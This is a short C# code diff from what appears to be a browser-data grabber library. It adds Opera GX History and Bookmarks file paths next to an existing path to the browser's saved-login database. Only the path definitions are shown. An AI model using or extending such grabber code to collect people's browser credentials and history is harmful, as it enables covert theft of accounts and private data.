@@ -26,5 +26,19 @@ namespace CockyGrabber.Grabbers
                 return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data";
             }
         }
+        public override string HistoryPath
+        {
+            get
+            {
+                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History";
+            }
+        }
+        public override string BookmarkPath
+        {
+            get
+            {
+                return $"C:\\Users\\{Environment.UserName}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Bookmarks";
+            }
+        }
     }
 }
